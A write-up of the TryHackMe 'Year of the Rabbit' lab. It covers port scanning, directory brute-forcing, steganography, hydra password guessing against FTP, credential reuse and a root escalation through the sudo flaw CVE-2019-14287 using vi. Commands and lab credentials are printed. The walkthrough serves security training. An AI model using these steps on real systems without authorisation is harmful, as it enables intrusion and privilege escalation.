---
title: "TryHackMe - Year of the Rabbit"
categories:
  - TryHackMe
tags:
  - writeup
  - tryhackme
  - enumeration
  - CVE-2019-14287
  - vi
---
Time to enter the warren...

## Scanning
Scanning all ports.

```bash
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVH
v9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/M
XkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2P
F5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0
nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTy
XG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh
80/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration
Let's run `gobuster` at port 80.

```bash
┌──(kali㉿kali)-[~]                                                                                                                                                          
└─$ gobuster dir -u 10.10.95.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,jpg,html,css,jpeg,txt,conf,ini,bak,swp,db                     
===============================================================                                                                                                              
Gobuster v3.0.1                                                                                                                                                              
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                                              
===============================================================                                                                                                              
[+] Url:            http://10.10.95.181                                                                                                                                      
[+] Threads:        100                                                                                                                                                      
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                             
[+] Status codes:   200,204,301,302,307,401,403                                                                                                                              
[+] User Agent:     gobuster/3.0.1                                                                                                                                           
[+] Extensions:     ini,bak,swp,php,css,jpeg,conf,db,jpg,html,txt                                                                                                            
[+] Timeout:        10s                                                                                                                                                      
===============================================================                                                                                                              
2021/01/30 08:21:31 Starting gobuster                                                                                                                                        
===============================================================                                                                                                              
/index.html (Status: 200)                                                                                                                                                    
/assets (Status: 301)
```

Checking the `/assets` directory.

<a href="/assets/images/tryhackme/year-of-the-rabbit/1.png"><img src="/assets/images/tryhackme/year-of-the-rabbit/1.png"></a>

Let's check the css file.

```css
 * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
  div.main_page {
    position: relative;
    display: table;

    width: 800px;

    margin-bottom: 3px;
    margin-left: auto;
    margin-right: auto;
    padding: 0px 0px 0px 0px;

    border-width: 2px;
    border-color: #212738;
    border-style: solid;

    background-color: #FFFFFF;

    text-align: center;
  }
```

Flag directory.. Let's visit `/sup3r_s3cr3t_fl4g.php`.

<a href="/assets/images/tryhackme/year-of-the-rabbit/2.png"><img src="/assets/images/tryhackme/year-of-the-rabbit/2.png"></a>

Let's see the process within with Developer Tools.

<a href="/assets/images/tryhackme/year-of-the-rabbit/4.png"><img src="/assets/images/tryhackme/year-of-the-rabbit/4.png"></a>

Let's visit the **hidden directory**.

<a href="/assets/images/tryhackme/year-of-the-rabbit/5.png"><img src="/assets/images/tryhackme/year-of-the-rabbit/5.png"></a>

Let's download the picture and do some basic steganography.

```bash
$ zsteg Hot_Babe.png                   
[?] 1244 bytes of extra data after image end (IEND), offset = 0x73ae7
extradata:0         .. text: "Ot9RrG7h2~24?\nEh, you've earned this. Username for FTP is ftpuser\nOne of these is the password:\nMou+56n%QK8sr\n1618B0AUshw1M\nA56IpIl%1s02u\nvTFbDzX9&Nmu?\nFfF~sfu^UQZmT\n8FF?iKO27b~V0\nua4W~2-@y7dE$\n3j39aMQQ7xFXT\nWb4--CTc4ww*-\nu6oY9?nHv84D&\n0iBp4W69Gr_Yf\nTS*%miyPsGV54\nC77O3FIy0c0sd\nO14xEhgg0Hxz1\n5dpv#Pr$wqH7F\n1G8Ucoce1+gS5\n0plnI%f0~Jw71\n0kLoLzfhqq8u&\nkS9pn5yiFGj6d\nzeff4#!b5Ib_n\nrNT4E4SHDGBkl\nKKH5zy23+S0@B\n3r6PHtM4NzJjE\ngm0!!EC1A0I2?\nHPHr!j00RaDEi\n7N+J9BYSp4uaY\nPYKt-ebvtmWoC\n3TN%cD_E6zm*s\neo?@c!ly3&=0Z\nnR8&FXz$ZPelN\neE4Mu53UkKHx#\n86?004F9!o49d\nSNGY0JjA5@0EE\ntrm64++JZ7R6E\n3zJuGL~8KmiK^\nCR-ItthsH%9du\nyP9kft386bB8G\nA-*eE3L@!4W5o\nGoM^$82l&GA5D\n1t$4$g$I+V_BH\n0XxpTd90Vt8OL\nj0CN?Z#8Bp69_\nG#h~9@5E5QA5l\nDRWNM7auXF7@j\nFw!if_=kk7Oqz\n92d5r$uyw!vaE\nc-AA7a2u!W2*?\nzy8z3kBi#2e36\nJ5%2Hn+7I6QLt\ngL$2fmgnq8vI*\nEtb?i?Kj4R=QM\n7CabD7kwY7=ri\n4uaIRX~-cY6K4\nkY1oxscv4EB2d\nk32?3^x1ex7#o\nep4IPQ_=ku@V8\ntQxFJ909rd1y2\n5L6kpPR5E2Msn\n65NX66Wv~oFP2\nLRAQ@zcBphn!1\nV4bt3*58Z32Xe\nki^t!+uqB?DyI\n5iez1wGXKfPKQ\nnJ90XzX&AnF5v\n7EiMd5!r%=18c\nwYyx6Eq-T^9\#@\nyT2o$2exo~UdW\nZuI-8!JyI6iRS\nPTKM6RsLWZ1&^\n3O$oC~%XUlRO@\nKW3fjzWpUGHSW\nnTzl5f=9eS&*W\nWS9x0ZF=x1%8z\nSr4*E4NT5fOhS\nhLR3xQV*gHYuC\n4P3QgF5kflszS\nNIZ2D%d58*v@R\n0rJ7p%6Axm05K\n94rU30Zx45z5c\nVi^Qf+u%0*q_S\n1Fvdp&bNl3#&l\nzLH%Ot0Bw&c%9\n"
imagedata           .. text: "*>7%OF\" "
b3,r,msb,xy         .. text: "@OXa|j1F"
b3,b,msb,xy         .. text: "e0\n5@m0gMm"
b3,bgr,lsb,xy       .. text: "'{Y)(p9ot"
b4,g,lsb,xy         .. text: "a1F%f21F"
b4,bgr,msb,xy       .. text: "?_Asjc~'"
```

We found the username and the list of passwords for the FTP. 

## Gaining Access
Let's bruteforce the password.

```bash
$ hydra -l ftpuser -P password.txt -t 16 -u 10.10.95.181 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-30 09:08:29
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.95.181:21/
[21][ftp] host: 10.10.95.181   login: ftpuser   password: 5iez1wGXKfPKQ
```

Let's login to the FTP.

```bash
$ ftp 10.10.95.181
Connected to 10.10.95.181.
220 (vsFTPd 3.0.2)
Name (10.10.95.181:kali): ftpuser      
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get *
local: Desktop remote: *
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (2.1387 MB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cat Eli\'s_Creds.txt 
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

We got the credential but it's still on the **brainfuck** representation. Let's decode it.

<a href="/assets/images/tryhackme/year-of-the-rabbit/6.png"><img src="/assets/images/tryhackme/year-of-the-rabbit/6.png"></a>

The credential is `eli:DSpDiM1wAEwid`. Let's SSH to the machine.

```bash
$ ssh eli@10.10.95.181           
The authenticity of host '10.10.95.181 (10.10.95.181)' can't be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.95.181' (ECDSA) to the list of known hosts.
eli@10.10.95.181's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$
```

Let's search the `leet s3cr3t` file.

```bash
eli@year-of-the-rabbit:/tmp$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
eli@year-of-the-rabbit:/tmp$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

We got gwendoline password, let's switch user.

```bash
eli@year-of-the-rabbit:/tmp$ su gwendoline
Password: 
gwendoline@year-of-the-rabbit:/tmp$
```

user.txt:

```bash
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{REDACTED}
```

## Privilege Escalation
Checking sudo priv.

```bash
gwendoline@year-of-the-rabbit:/tmp$ sudo -
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

We can use this behaviour from CVE-2019-14287 to get root.

```bash
wendoline@year-of-the-rabbit:/tmp$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
## Type :!/bin/sh and we got root
# whoami
root
```

root.txt:

```bash
# cat /root/root.txt
THM{REDACTED}
```